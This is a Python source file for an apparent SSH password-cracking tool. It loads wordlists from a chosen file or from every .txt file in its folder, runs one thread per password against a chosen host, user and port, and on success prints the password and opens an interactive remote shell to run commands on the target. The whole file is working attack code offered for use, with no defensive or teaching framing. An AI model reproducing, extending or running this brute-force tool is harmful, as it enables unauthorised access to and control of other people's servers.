import asyncssh, asyncio, sys, threading, ctypes, os, time, colorama
from colorama import Fore

colorama.init()

passwords = []
counter = 0
attempts = []
async def shell(host, user, password, port=22,):
    async with asyncssh.connect(host, port, username=user, password=password) as conn:
        print(f"{Fore.RESET}Connected To {Fore.MAGENTA}{user}{Fore.LIGHTBLACK_EX}@{Fore.MAGENTA}{host} {Fore.WHITE}|{Fore.LIGHTBLACK_EX} Password - {Fore.MAGENTA}{password} {Fore.WHITE}|")
        print(f"{Fore.RED}This is a very primitive shell, I'd recommend you to just connect via ssh.{Fore.RESET}")
        while True:
            try:
                command = input(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}{user}{Fore.LIGHTBLACK_EX}]{Fore.WHITE}> ")
                result = await conn.run(command, check=False)
                print(result.stdout)
                print(result.stderr)
                if result.exit_status != 0:
                    print(f"{Fore.RED}Exit Status : {result.exit_status}{Fore.RESET}")
                if command == "exit":
                    break
                if command == "clear":
                    os.system("cls")
            except:
                pass

def open_list(wordlist):
    counter = 0
    try:
        f=open(wordlist, "r", encoding="utf-8")
        for letter in f:
            word = letter.strip("\n")
            passwords.append(word)
            counter += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f"Appending To File : {counter}")
            if counter == 5000000:
                break
    except:
        pass

def get_wordlists():
    paths = []
    wordlists = []
    print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}*{Fore.LIGHTBLACK_EX}] {Fore.WHITE}Looking For Wordlists 1/3")

    for thing in os.listdir():
        thing = str(thing)
        paths.append(thing)

    for object in paths:
        temp = str(object)
        if temp.endswith(".txt"):
            wordlists.append(temp)
    
    for list in wordlists:
        print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}+{Fore.LIGHTBLACK_EX}] {Fore.WHITE}Using Wordlist {Fore.MAGENTA}{list}{Fore.RESET} 2/3")
        time.sleep(0.3)
        print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}+{Fore.LIGHTBLACK_EX}] {Fore.WHITE}Appending Words To List 3/3")
        open_list(list)

async def run_client(host, user, password, port=22,):
    async with asyncssh.connect(host, port, username=user, password=password) as conn:
        result = await conn.run(f'echo "{Fore.YELLOW}SSH Worked {Fore.LIGHTBLACK_EX}- {Fore.MAGENTA}{password}"', check=True)
        print(result.stdout, end='')
        
        global h
        global p
        global po
        global u
        po = port
        u = user
        h = host
        p = password
        x = input(f"{Fore.RESET}Press {Fore.LIGHTBLACK_EX}[{Fore.GREEN}ENTER{Fore.LIGHTBLACK_EX}] {Fore.WHITE}to establish a shell with {Fore.LIGHTBLACK_EX}{u}{Fore.MAGENTA}@{Fore.LIGHTBLACK_EX}{h}{Fore.WHITE} {Fore.GREEN}OR{Fore.WHITE} Press {Fore.LIGHTBLACK_EX}[{Fore.GREEN}E{Fore.LIGHTBLACK_EX}]{Fore.WHITE} to exit.\n{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}INPUT{Fore.LIGHTBLACK_EX}]{Fore.WHITE}> ")
        if x == "":
            print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}+{Fore.LIGHTBLACK_EX}]{Fore.WHITE} Initializing Shell...")
        try:
            await shell(host, user, password, port)
        except:
            await shell(host, user, password, port)
        if x == "e":
            exit()
        if x == "E":
            exit()
        
    
def run_thread(host, user, password, port):
    global counter
    try:
        
        thread = threading.Thread(target=asyncio.run(run_client(host, user, password, port)))
        thread.start()

    except Exception as e:
        try:
            if str(e).startswith("Connection lost"):
                asyncio.run(run_client(host, user, password, port))

            if str(e).startswith("Permission"):
                counter += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f"Password - [{counter}/{len(passwords)}] - Using Password : {password}")
                passwords.remove(password)
            
            if str(e).startswith("[WinError 64] The specified network name is no longer available"):
                asyncio.run(run_client(host, user, password, port))

            if str(e).endswith("expired"):
                asyncio.run(run_client(host, user, password, port))    
        except:
            pass


def sshcrack():
    print(f"{Fore.YELLOW}Enter SSH Host {Fore.LIGHTBLACK_EX}:{Fore.MAGENTA} ", end="")
    host = input("")
    print(f"{Fore.YELLOW}Enter SSH Username {Fore.LIGHTBLACK_EX}:{Fore.MAGENTA} ", end="")
    user = input("")
    print(f"{Fore.YELLOW}Enter SSH Port OR Press {Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}ENTER{Fore.LIGHTBLACK_EX}]{Fore.YELLOW} To Use The Default{Fore.LIGHTBLACK_EX} :{Fore.MAGENTA} ", end="")
    port = input("")
    if port == "":
        port = 22
    print(f"{Fore.YELLOW}Enter Wordlist OR Press {Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}ENTER{Fore.LIGHTBLACK_EX}]{Fore.YELLOW} To Use The Default{Fore.LIGHTBLACK_EX} :{Fore.MAGENTA} ", end="")
    wordlist = input("")
    if wordlist == "":
        print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}+{Fore.LIGHTBLACK_EX}] {Fore.WHITE}Getting Wordlists\n")
        get_wordlists()
    else:
        try:
            open_list(wordlist)
        except:
            pass
    
    os.system("cls")

    ctypes.windll.kernel32.SetConsoleTitleW(f"Attempting Connection - {user}:{host}:{port}")


    print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}*{Fore.LIGHTBLACK_EX}] {Fore.WHITE}Cracking {Fore.YELLOW}{user}{Fore.LIGHTBLACK_EX}:{Fore.YELLOW}{host}{Fore.LIGHTBLACK_EX}:{Fore.YELLOW}{port}")
    for password in passwords:
        thread = threading.Thread(target=run_thread, args=(host, user, password, port))
        thread.start()

def sshcrackwsys(arg, wordlist_args=None):
    args = str(arg)
    full = args.split(":")
    user = full[0]
    host = full[1]
    try:
        port = int(full[2])
    except:
        port = 22

    if wordlist_args is None:
        print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}+{Fore.LIGHTBLACK_EX}] {Fore.WHITE}Getting Wordlists\n")
        get_wordlists()
    else:
        print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}+{Fore.LIGHTBLACK_EX}]{Fore.WHITE} Using Wordlist {Fore.MAGENTA}{wordlist_args}")
        try:
            open_list(wordlist_args)
        except:
            #print(f"{Fore.RED}Wordlist Does Not Exist Perhaps You Spelt Wrong?")
            pass

    os.system("cls")

    ctypes.windll.kernel32.SetConsoleTitleW(f"Attempting Connection - {user}:{host}:{port}")

    print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}*{Fore.LIGHTBLACK_EX}] {Fore.WHITE}Cracking {Fore.YELLOW}{user}{Fore.LIGHTBLACK_EX}:{Fore.YELLOW}{host}{Fore.LIGHTBLACK_EX}:{Fore.YELLOW}{port}")
    for password in passwords:
        thread = threading.Thread(target=run_thread, args=(host, user, password, port))
        thread.start()
    thread.join()

def pycracker():
    try:
        args = sys.argv[1]
        try:
            wordlist_args = sys.argv[2]
            sshcrackwsys(args, wordlist_args)
        except IndexError:
            sshcrackwsys(args)
    except IndexError:
        sshcrack()

pycracker()